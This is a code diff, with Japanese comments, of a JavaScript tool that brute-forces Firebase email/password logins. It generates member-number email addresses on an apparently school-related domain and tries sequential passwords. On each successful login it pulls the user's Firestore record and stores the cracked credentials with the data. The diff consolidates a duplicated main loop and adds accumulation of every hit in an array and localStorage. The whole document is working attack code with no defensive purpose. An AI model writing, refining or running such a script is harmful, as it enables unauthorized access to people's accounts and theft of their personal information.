@@ -100,7 +100,6 @@ function parsePwRange(text) {
     parseInt(b)
   ];
 }
-
 // =======================
 // メイン処理
 // =======================
@@ -121,126 +120,8 @@ async function run() {
     const [prefix, pStart, pEnd] =
       parsePwRange(pwText);
 
-    for (let m = mStart; m <= mEnd; m++) {
-
-      if (!running) {
-        log("停止");
-        return;
-      }
-
-      const member =
-        String(m).padStart(8, "0");
-
-      const email =
-        `${member}@your-school-member.com`;
-
-      for (let p = pStart; p <= pEnd; p++) {
-
-        if (!running) {
-          log("停止");
-          return;
-        }
-
-        const password =
-          `${prefix}${p}`;
-
-        log(`試行 ${email} / ${password}`);
-
-        try {
-
-          // ログイン
-          const cred =
-            await signInWithEmailAndPassword(
-              auth,
-              email,
-              password
-            );
-
-          log("ログイン成功");
-
-          const uid = cred.user.uid;
-
-          // Firestore取得
-          const memberId =
-            localStorage.getItem("memberId") || uid;
-
-          const snap =
-            await getDoc(
-              doc(db, "users", memberId)
-            );
-
-          if (snap.exists()) {
-
-            const data = snap.data();
-
-            const jsonText =
-              JSON.stringify(data, null, 2);
-
-            document.getElementById("result").value =
-              jsonText;
-
-            console.log(jsonText);
-
-            await navigator.clipboard.writeText(jsonText);
-
-            log("JSON取得成功");
-            log("クリップボードへコピー");
-
-            running = false;
-            return;
-
-          } else {
-
-            log("ドキュメントなし");
-
-          }
-
-        } catch (e) {
-
-          log("失敗:", e.message);
-
-        }
-
-      }
-
-    }
-
-    log("終了");
-
-  } catch (e) {
-
-    log("入力形式エラー");
-    log(e.message);
-
-  }
-
-}
-
-  // =======================
-// 成功結果保存配列
-// =======================
-
-const foundResults = [];
-
-// =======================
-// メイン処理
-// =======================
-
-async function run() {
-
-  try {
-
-    const memberText =
-      document.getElementById("memberRange").value;
-
-    const pwText =
-      document.getElementById("pwRange").value;
-
-    const [mStart, mEnd] =
-      parseMemberRange(memberText);
-
-    const [prefix, pStart, pEnd] =
-      parsePwRange(pwText);
+    // 発見結果保存用
+    const foundResults = [];
 
     for (let m = mStart; m <= mEnd; m++) {
 
@@ -280,7 +161,7 @@ async function run() {
               password
             );
 
-          log("ログイン成功");
+          log(`ログイン成功: ${email} / ${password}`);
 
           const uid = cred.user.uid;
 
@@ -300,40 +181,35 @@ async function run() {
 
             const data = snap.data();
 
-            // =======================
-            // 保存データ
-            // =======================
-
+            // 保存用データ
             const resultData = {
-              member,
               email,
               password,
-              uid,
+              memberId,
               data
             };
 
+            // 配列に追加
             foundResults.push(resultData);
 
-            // =======================
-            // 表示更新
-            // =======================
-
-            document.getElementById("result").value =
+            // JSON文字列
+            const jsonText =
               JSON.stringify(foundResults, null, 2);
 
+            // 表示更新
+            document.getElementById("result").value =
+              jsonText;
+
+            // Console
             console.log(resultData);
 
-            // =======================
             // localStorage保存
-            // =======================
-
             localStorage.setItem(
               "foundResults",
-              JSON.stringify(foundResults)
+              jsonText
             );
 
-            log(`発見 ${member} / ${password}`);
-            log(`現在 ${foundResults.length} 件保存`);
+            log(`JSON取得成功 (${foundResults.length}件)`);
 
           } else {
 
@@ -343,7 +219,7 @@ async function run() {
 
         } catch (e) {
 
-          log("失敗:", e.message);
+          log(`失敗: ${e.message}`);
 
         }
 
@@ -351,7 +227,7 @@ async function run() {
 
     }
 
-    log("最後まで完了");
+    log("全探索終了");
 
   } catch (e) {
 
